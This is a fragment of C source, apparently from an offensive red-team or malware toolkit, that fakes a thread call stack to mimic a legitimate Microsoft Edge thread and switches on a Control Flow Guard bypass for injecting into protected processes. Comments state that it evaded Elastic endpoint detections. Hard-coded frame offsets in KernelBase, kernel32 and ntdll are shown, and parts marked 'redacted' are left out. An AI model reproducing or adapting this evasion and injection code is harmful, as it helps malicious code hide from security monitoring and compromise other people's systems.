/* spoof legitimate msedge thread callstack */

//WINBASEAPI BOOL WINAPI KERNEL32$SetDllDirectoryW(LPCWSTR lpPathName);

#ifdef _WIN64

/*
 *   Enable the CFG bypass technique which is needed to inject into processes
 *   protected Control Flow Guard (CFG) on supported version of Windows.
 */
#define CFG_BYPASS 1
#if CFG_BYPASS
#include "cfg.c"
#endif

/* redacted */

void set_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;
    
    /* uncomment to include msedge.dll calls - be sure to uncomment function declaration at the top of this file also
       this directory will be different on different versions of Windows so you may want to add code that searches for it
       I was able to evade elastic detections without including msedge.dll calls */
    //KERNEL32$SetDllDirectoryW(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\121.0.2277.83\\");
    
    set_frame_info(&callstack[i++], L"KernelBase", 0, 0x230ce, 0, FALSE);
    
    //set_frame_info(&callstack[i++], L"msedge", 0, 0xdd0d12, 0, FALSE);
    //set_frame_info(&callstack[i++], L"msedge", 0, 0xdd0b5c, 0, FALSE);
    //set_frame_info(&callstack[i++], L"msedge", 0, 0x24aed2, 0, FALSE);
    //set_frame_info(&callstack[i++], L"msedge", 0, 0x2d9bc8, 0, FALSE);
    //set_frame_info(&callstack[i++], L"msedge", 0, 0x287d14, 0, FALSE);
    
    set_frame_info(&callstack[i++], L"kernel32", 0, 0x17344, 0, FALSE);
    set_frame_info(&callstack[i++], L"ntdll", 0, 0x526b1, 0, FALSE);

    *number_of_frames = i;
}

/* redacted */